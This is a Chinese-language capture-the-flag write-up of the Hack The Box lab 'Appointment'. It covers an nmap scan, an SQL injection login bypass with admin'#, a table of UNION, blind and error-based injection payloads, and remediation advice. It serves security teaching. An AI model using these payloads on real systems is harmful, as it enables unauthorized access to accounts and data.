---
title: "HTB Starting Point - Appointment 渗透测试报告"
date: 2026-07-11T16:15:00+08:00
draft: false
categories: ["渗透测试"]
tags: ["HTB", "Starting Point", "Appointment", "SQL注入", "OWASP", "Web安全"]
---

## HTB Starting Point - Appointment 渗透测试报告

### 一、靶机信息

| 项目 | 内容 |
|------|------|
| 平台 | Hack The Box (HTB) |
| 分类 | Starting Point / Tier 0 |
| 机器名 | Appointment |
| 目标 IP | 10.129.139.239 |
| 难度 | 入门级 |

---

### 二、渗透测试完整流程

#### 阶段 1：信息收集（端口扫描）

```bash
nmap -sV -T4 -Pn 10.129.139.239
```

**扫描结果：**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

**关键发现：** 仅开放 80 端口，Apache Web 服务器。

#### 阶段 2：Web 页面枚举

访问 `http://10.129.139.239`，发现一个**登录表单**，包含用户名和密码输入框。

这是典型的 Web 入口——优先试 SQL 注入绕过认证。

---

#### 阶段 3：漏洞分析

SQL 注入认证绕过的核心原理：

后端登录代码典型写法：
```sql
SELECT * FROM users WHERE username = '{用户输入}' AND password = '{用户输入}'
```

正常登录：输入 `admin` / `password123`，数据库执行：
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
```

如果用户名和密码都匹配才返回用户记录，否则返回空。

**绕过思路：** 利用 SQL 注释符 `#` 把密码校验部分"吃掉"。

---

#### 阶段 4：漏洞利用

用户名输入：`admin'#`
密码：任意填写（如 `123`）

实际执行的 SQL 变为：
```sql
SELECT * FROM users WHERE username = 'admin'#' AND password = '123'
                                                    └──────────────────
                                                        被注释忽略
```

数据库实际执行：
```sql
SELECT * FROM users WHERE username = 'admin'
```

只要 `admin` 用户存在，直接登录成功，无需密码。

#### 完整流程拆解

```
输入: admin'#
      │    │
      │    └── # 开启注释，后面全部作废
      └── admin 正常用户名，单引号闭合
```

| SQL 字符 | 作用 |
|----------|------|
| `'` | 闭合 SQL 语句中原本的 `'`，让人名部分提前结束 |
| `#` | 单行注释符，从 `#` 开始到行尾全部被忽略 |
| `-- ` | 另一种注释符（两个短线 + 空格），功能相同 |

---

### 三、攻击链总结

```
nmap → 80/tcp Apache
    │
    ▼
访问 Web → 登录表单
    │
    ▼
SQL 注入认证绕过
admin'# / 任意密码
    │
    ▼
登录成功 → Dashboard → Flag
```

---

### 四、六台机器总览

| # | 机器 | 端口 | 服务 | 攻击方式 | 攻击类型 |
|---|------|------|------|----------|----------|
| 1 | Meow | 23 | Telnet | root 空密码 | 弱配置 |
| 2 | Fawn | 21 | FTP | anonymous 空密码 | 弱配置 |
| 3 | Cap | 80+21 | HTTP+FTP | IDOR → pcap → 明文密码 | 越权+信息泄露 |
| 4 | Dancing | 445 | SMB | Guest 空密码共享 | 弱配置 |
| 5 | Redeemer | 6379 | Redis | 未授权访问 | 弱配置 |
| 6 | Appointment | 80 | HTTP(Apache) | SQL 注入认证绕过 | **Web 漏洞** |

第 6 台是从"弱配置"到"Web 漏洞"的转折点。

---

### 五、SQL 注入入门知识

#### 5.1 什么是 SQL 注入？

用户输入被直接拼接到 SQL 查询语句中，攻击者通过构造特殊输入改变 SQL 语句的逻辑。

#### 5.2 常见注入类型

| 类型 | 说明 | 示例 |
|------|------|------|
| 认证绕过 | 注释掉密码校验 | `admin'#` |
| Union 注入 | 联合查询其他表数据 | `' UNION SELECT 1,2,3-- ` |
| 盲注 | 逐字符猜解数据 | `' AND SUBSTRING(password,1,1)='a` |
| 报错注入 | 利用错误信息泄露数据 | `' AND extractvalue(1,concat(0x7e,@@version))-- ` |

#### 5.3 常见注释符

| 数据库 | 注释符 |
|--------|--------|
| MySQL / MariaDB | `#` 或 `-- `（短线+空格） |
| PostgreSQL | `--` |
| SQL Server | `--` |
| Oracle | `--` |

---

### 六、修复建议

| 问题 | 建议 |
|------|------|
| SQL 注入 | 使用参数化查询（Prepared Statement），不拼接用户输入 |
| 密码明文/弱加密 | 使用 bcrypt/argon2 哈希存储密码 |
| 错误信息泄露 | 禁用详细数据库错误回显，统一返回通用错误页面 |
| 无输入校验 | 对用户名等字段做白名单校验（只允许字母数字） |
| 无登录限制 | 实施登录失败次数限制和账户锁定策略 |
